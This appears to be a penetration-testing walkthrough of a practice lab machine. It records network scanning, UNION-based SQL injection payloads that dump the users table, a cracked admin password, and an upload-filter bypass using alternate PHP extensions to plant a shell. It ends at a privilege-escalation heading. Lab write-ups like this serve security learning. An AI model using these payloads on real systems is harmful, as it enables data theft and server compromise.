┌──(root㉿kali)-[/home/kali/Desktop/HackNote]
└─# arp-scan --local
Interface: eth0, type: EN10MB, MAC: 00:0c:29:03:dd:4c, IPv4: 192.168.79.3
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.79.1	0a:00:27:00:00:17	(Unknown: locally administered)
192.168.79.2	08:00:27:b0:8f:b5	PCS Systemtechnik GmbH
192.168.15.4	08:00:27:7c:9a:15	PCS Systemtechnik GmbH

nmap Recon:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.16 ((Debian))

found sqli here : http://192.168.15.4/cat.php?id=1%27
and here i approve that: http://192.168.15.4/cat.php?id=1--+-
I send the request to burp 
GET /cat.php?id=1%20order%20by%402--+- HTTP/1.1
Host: 192.168.15.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

I found 4 columns 
I see that columns 2 is vulnerable,  Now i send request into cyberfox 
I try this to see the version : http://192.168.15.4/cat.php?id=1+union+select+1,version(),3,4--+-
and user http://192.168.15.4/cat.php?id=1+union+select+1,user(),3,4--+-
Using cyberfox dios :
i found Picture: 01: id<br>02: login<br>03: password<br>
Now using : http://192.168.15.4/cat.php?id=1+union+select+1,(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,login,0x3a,password,0x3c62723e))))x),3,4--+-
Picture: admin:8efe310f9ab3efeae8d410a8e0166eb2<br>
and cracked : 8efe310f9ab3efeae8d410a8e0166eb2:P4ssw0rd
Now i will login to admin account using these username and pass
Now trying to get a reverse shell using this admin panel
I have tried to add a php shell but i got  NO PHP!!
I will bypass that using .phtml
I fireUP my Burp and intercept request and send them to intruder 
Now i will try to identify good extension
phps phtar and phtml, pHP works
but access not work now i tried pHP and it's work
PrivEsc
Now i need to escalate my privilege